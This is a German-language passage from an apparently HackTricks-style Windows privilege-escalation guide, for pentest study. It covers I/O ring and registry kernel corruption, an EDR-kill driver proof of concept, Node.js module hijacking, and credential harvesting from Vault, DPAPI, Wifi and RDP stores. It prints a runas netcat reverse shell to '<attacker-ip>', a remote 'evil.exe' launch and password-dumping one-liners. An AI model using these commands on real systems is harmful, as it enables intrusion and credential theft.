- **Refill-Ziele mit vielen Zeigern**: Registrierte Buffer-Arrays von Windows-**I/O-Rings** sind ausgezeichnete Offenlegungsziele, da ihre paged-pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und beschädige anschließend **`RegBuffers`** und **`RegBuffersCount`**, sodass nachfolgende I/O-Ring-Operationen vom Angreifer gefälschte Einträge verwenden und beliebiges Kernel-Read/Write ermöglichen. Wenn der einzige verfügbare Write ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Writes**, um einen wiederholten Byte-Userspace-Zeiger wie `0x0101010101010101` zu erzeugen, ordne ihn mit `VirtualAlloc` zu und platziere das gefälschte Array registrierter Buffer dort.<sup>[[30]](#references)</sup>

Nützliche Hinweise zur Fehlersuche:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehl mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry-Hive-Speicherkorruptions-Primitives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts zu erzeugen, beschreibbare HKLM-/HKU-Unterknoten auszunutzen und Metadatenkorruption ohne eigenen Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Hier findest du die vollständige Angriffskette:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-Typverwechslung im Direct-Modus über vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen anschließend `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` in eine skalare Stack-Variable wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert, nicht anhand des vom Entwickler erwarteten Typs.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherkorruption**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder gepufferte Binärdaten mit angegebener Größe typverwechselt.

Praktische Hinweise zur Ausnutzung:

- **Abschwächung ab Windows 8**: Trifft die Abfrage auf eine **nicht vertrauenswürdige Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` bereitzustellen.
- **Bereitstellung in einer vertrauenswürdigen Hive**: Verwende NtObjectManager, um beschreibbare Unterknoten von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity-Token** erneut aus, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibvorgang von 8 Byte in einen 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direkten Modus muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zunächst einen vom Angreifer kontrollierten `REG_DWORD` in einen Stack-Skalar und verwendet denselben Puffer anschließend erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibvorgang.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direkte Modus den ersten `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen **negativen**, vom Angreifer kontrollierten Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist oft der sauberste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Starkes Suchmuster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche mit grep nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, in denen der erste Registry-Lesevorgang darüber entscheidet, ob ein zweiter stattfindet.

#### Ausnutzen von FILE_DEVICE_SECURE_OPEN, das bei Geräteobjekten fehlt (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit einer zusätzlichen Komponente nicht durchgesetzt. Dadurch kann jeder nicht privilegierte Benutzer einen Handle erhalten, indem er einen Namespace-Pfad wie diesen verwendet:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulationen missbrauchen. In freier Wildbahn beobachtete Funktionen:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkte Lese-/Schreibzugriffe auf Rohdatenträger (Offline-Manipulationen, Persistenztricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Benutzermodus über den Kernel beendet werden kann.

Minimales PoC-Muster (Benutzermodus):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Maßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Prüfe bei privilegierten Vorgängen den Kontext des Aufrufers. Führe PP/PPL-Prüfungen durch, bevor du Prozesse beendest oder Handles zurückgibst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsmöglichkeiten für Verteidiger
- Überwache Öffnungsversuche aus dem User-Mode auf verdächtige Gerätenamen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts Sperrliste für anfällige Treiber durch (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der im PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL kapern und **deine Rechte erweitern**.<sup>[[2]](#references)</sup>

Prüfe die Berechtigungen aller Ordner im PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie diese Prüfung missbraucht werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js- / Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **uncontrolled search path** unter Windows, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen Bare Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node sucht nach Paketen, indem es im Verzeichnisbaum nach oben geht und in jedem übergeordneten Verzeichnis `node_modules`-Ordner prüft. Unter Windows kann diese Suche bis zum Laufwerksstamm gelangen. Daher könnte eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Kann ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen, kann er eine bösartige Datei `foo.js` (oder einen Paketordner) dort ablegen und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dies führt also zu **LPE**, wenn das Ziel als Administrator, über eine Aufgabe mit erhöhten Berechtigungen/einen Service-Wrapper oder als automatisch gestartete privilegierte Desktop-App ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen wurde oder nicht installiert werden konnte
- das verwundbare `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode liegt

### Suche nach verwundbaren Zielen

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = ausführbare Datei des Ziels (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und das letzte erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Muster bei Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder einer Quellcodeprüfung.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Platziere ein Modul mit dem exakt erwarteten Namen:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Zielanwendung aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die wiederverwendbare **Technik** besteht jedoch darin, nach einem beliebigen **fehlenden Bare Import** zu suchen, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsideen

- Alarmieren Sie, wenn ein Benutzer `C:\node_modules` erstellt oder neue `.js`-Dateien/-Pakete dort ablegt.
- Suchen Sie nach Prozessen mit hoher Integrität, die auf `C:\node_modules\*` zugreifen.
- Bündeln Sie alle Laufzeitabhängigkeiten in der Produktion und prüfen Sie die Verwendung von `optionalDependencies`.
- Überprüfen Sie Drittanbietercode auf stille Muster wie `try { require("...") } catch {}`.
- Deaktivieren Sie optionale Prüfungen, sofern die Bibliothek dies unterstützt (beispielsweise können einige `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer in der hosts-Datei fest codiert sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfen Sie von außen auf **eingeschränkte Dienste**.

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener solltest du seine PID dem Prozesseigentümer, dem ausführbaren Pfad und allen Diensten oder geplanten Tasks zuordnen, die ihn starten. Ein Fernsteuerungsdienst kann nur dann Zugriff als Desktopbenutzer ermöglichen, wenn seine Authentifizierungs- und Befehlssteuerungen dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherbeschädigung eine Analyse genau dieser Binärdatei und der Eingaben erfordert, die sie erreichen können. Scheint ein offener Port zu einem Systemprozess zu gehören, vergleiche ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor du den Backend-Dienst zuordnest; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

[Weitere Befehle zur Netzwerkerkennung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du Root-Rechte erhältst, kannst du an jedem Port lauschen (beim ersten Aufruf von `nc.exe`, um an einem Port zu lauschen, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash ganz einfach als root zu starten, kannst du `--default-user root` verwenden.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

`root` unter Linux in WSL gewährt nicht automatisch Administratorrechte unter Windows. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Anmeldedaten gespeichert wurden. Für eine Rechteausweitung sind weiterhin ein gültiges Konto mit höheren Berechtigungen und ein zulässiger Authentifizierungsweg erforderlich. Die Verzeichnisstruktur `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution üblicherweise auf einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zunächst die tatsächliche Distribution und den Speicherpfad. Vermeide es, Verlaufsinhalte bei der automatisierten Enumeration auszugeben.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nichtleerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort ausgelesen werden kann, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA secret speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen weder, ob dieses Secret existiert, noch ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, die **Windows** verwenden kann, um **Benutzer automatisch anzumelden**. Zunächst könnte es so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen. So funktioniert es jedoch nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (einen Server oder eine Website) **zuzugreifen**, diese Anmeldeinformationsverwaltung und Windows Vault nutzen und die hinterlegten Anmeldeinformationen verwenden kann, anstatt dass Benutzer jedes Mal ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn Anwendungen nicht mit der Anmeldeinformationsverwaltung interagieren, können sie die Anmeldeinformationen für eine bestimmte Ressource meiner Meinung nach nicht verwenden. Wenn deine Anwendung also den Vault nutzen soll, muss sie irgendwie **mit der Anmeldeinformationsverwaltung kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Vault-Speicher anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Anschließend kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel führt eine Remote-Binärdatei über eine SMB-Freigabe aus.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit bereitgestellten Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstokens und Klartextpasswörter im Universal Windows Platform (UWP) `PasswordVault` (in `vaultcmd` auch als `Web Credentials` angezeigt). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege` zu benötigen.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter auszulesen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird überwiegend im Windows-Betriebssystem zur symmetrischen Verschlüsselung privater asymmetrischer Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das maßgeblich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Schlüssel von Benutzern werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht typischerweise aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und seine Inhalte daher nicht mit dem Befehl `dir` in CMD aufgelistet werden können, wohl aber über PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Master-Passwort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You kannst das **mimikatz module** `dpapi::cred` mit dem entsprechenden `/masterkey` zum Entschlüsseln verwenden.\
Du kannst mit dem Modul `sekurlsa::dpapi` viele **DPAPI**-**masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting**- und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventur darauf hinweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` anzunehmen: [Windows kann Profile an anderen Orten speichern](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss außerdem über die erforderlichen Rechte für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei der routinemäßigen Aufzählung verschlüsselte oder entschlüsselte Werte auszugeben.

Um PS-Anmeldeinformationen aus der Datei zu **entschlüsseln**, in der sie enthalten sind, kannst du Folgendes ausführen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie **viele DPAPI-Masterkeys** aus dem Arbeitsspeicher extrahieren.

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor Sie eine XML-Datei als Hinweis auf Zugangsdaten betrachten. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Geben Sie bei einer umfassenden Suche keine verschlüsselten Werte aus.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachten Sie ein nicht leeres Passwortelement als Hinweis auf Zugangsdaten, ohne es auszugeben oder davon auszugehen, dass es im Klartext vorliegt: [Laut Angaben des Anbieters](https://www.donkz.nl/) kann der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger streng konfiguriert sein. Bestätigen Sie die Herkunft der Datei und die Bedingungen für die Wiederherstellung, bevor Sie sich darauf verlassen.

### Sticky Notes

Viele verwenden die StickyNotes-App auf Windows-Arbeitsstationen, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer gesucht und untersucht werden.

Manchmal speichern Nutzer Passwörter und andere Informationen in Haftnotiz-Anwendungen. Die paketierte Sticky-Notes-App von Microsoft speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie das Fehlen einer SQLite-Datei als Hinweis darauf werten, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich festgeschriebene Notizen auslassen. Bewahren Sie `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und fügen Sie, sofern verfügbar, auch `plum.sqlite-shm` hinzu; der Shared-Memory-Index kann neu erstellt werden, aber die WAL-Datei gehört zum dauerhaften Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein Hinweis auf Zugangsdaten: Überprüfen Sie das Konto, die zulässigen Zugriffsrechte und eine mögliche Wiederverwendung des Passworts separat. Für einen verschlüsselten Eintrag in einem Passwortmanager sind außerdem der tatsächliche Entschlüsselungsschlüssel und die anwendungsspezifische Interpretation erforderlich, bevor damit eine Anmeldung mit höheren Berechtigungen belegt werden kann.

### AppCmd.exe

**Beachten Sie, dass Sie zum Wiederherstellen von Passwörtern aus AppCmd.exe Administrator sein und das Programm mit einem hohen Integritätslevel ausführen müssen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
